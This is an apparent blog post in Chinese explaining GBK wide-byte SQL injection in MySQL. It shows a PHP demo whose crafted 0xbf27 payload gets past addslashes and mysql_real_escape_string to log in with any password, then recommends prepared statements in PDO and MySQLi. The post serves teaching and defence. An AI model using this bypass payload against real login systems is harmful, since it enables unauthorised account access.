---
title: "Mysql宽字节注入"
date: 2016-03-05 21:01
---

## mysql 宽字节注入

## 绕过`addslasher`和`mysql_real_escape_string`(Trick)

> 在MYSQL5.5.37-log下该Trick已经被修复了

demo as follow:

* mysql

``` 
mysql> create database test_gbk default charset GBK; 
Query OK, 1 row affected (0.00 sec)

mysql> use test_gbk;
Database changed

mysql> CREATE TABLE users (  
    username VARCHAR(32) CHARACTER SET GBK,  
    password VARCHAR(32) CHARACTER SET GBK,  
    PRIMARY KEY (username)  
); 
Query OK, 0 rows affected (0.53 sec)
  
mysql> insert into users SET username='t1', password='t123456';  
Query OK, 1 row affected (0.01 sec)  

mysql> insert into users SET username='t2', password='t223456';  
Query OK, 1 row affected (0.01 sec)
  
mysql> insert into users SET username='t3', password='t33456';  
Query OK, 1 row affected (0.01 sec) 
```

* php

```php
<?php  
echo "PHP version: ".PHP_VERSION."\n";  

# change as yours  
mysql_connect('servername','username','password');  

mysql_select_db("test_gbk");  
mysql_query("SET NAMES GBK");  
  
$_POST['username'] = chr(0xbf).chr(0x27).' OR username = username /*';  
$_POST['password'] = 'guess';  
  
$username = addslashes($_POST['username']);  
$password = addslashes($_POST['password']);  
$sql = "SELECT * FROM  users WHERE  username = '$username' AND password = '$password'";  
$result = mysql_query($sql) or trigger_error(mysql_error().$sql);  
  
var_dump(mysql_num_rows($result));  
var_dump(mysql_client_encoding());  
  
$username = mysql_real_escape_string($_POST['username']);  
$password = mysql_real_escape_string($_POST['password']);  
$sql = "SELECT * FROM  users WHERE  username = '$username' AND password = '$password'";  
$result = mysql_query($sql) or trigger_error(mysql_error().$sql);  
  
var_dump(mysql_num_rows($result));  
var_dump(mysql_client_encoding());  
  
mysql_set_charset("GBK");  
$username = mysql_real_escape_string($_POST['username']);  
$password = mysql_real_escape_string($_POST['password']);  
$sql = "SELECT * FROM  users WHERE  username = '$username' AND password = '$password'";  
$result = mysql_query($sql) or trigger_error(mysql_error().$sql);  
  
var_dump(mysql_num_rows($result));  
var_dump(mysql_client_encoding());  
```

run 

```
$php test_gbk.php

PHP version: 5.2.5  
int(3)  
string(6) "latin1"  
int(3)  
string(6) "latin1"  
int(0)  
string(3) "gbk"
```

使用addslashes还是mysql_real_escape_string,我都可以利用编码的漏洞来实现输入任意密码就能登录服务器的注入攻击！！！！

第三个mysql_real_escape_string之所以能够防注入是因为mysql_escape_string本身并没办法判断当前的编码，必须同时指定服务端的编码和客户端的编码，加上就能防编码问题的注入了

* 解决方案

使用拥有Prepared Statement机制的PDO和MYSQLi来代替mysql_query(注：mysql_query自 PHP 5.5.0 起已废弃，并在将来会被移除)：

PDO：

```php
$pdo = new PDO('mysql:dbname=dbtest;host=127.0.0.1;charset=utf8', 'user', 'pass');  
  
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);  
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);  
$stmt = $pdo->prepare('SELECT * FROM employees WHERE name = :name');  
$stmt->execute(array('name' => $name));  
  
foreach ($stmt as $row) {  
    // do something with $row  
}  
```

MYSQLi：

```
$stmt = $dbConnection->prepare('SELECT * FROM employees WHERE name = ?');  
$stmt->bind_param('s', $name);  
  
$stmt->execute();  
  
$result = $stmt->get_result();  
while ($row = $result->fetch_assoc()) {  
    // do something with $row  
}  
```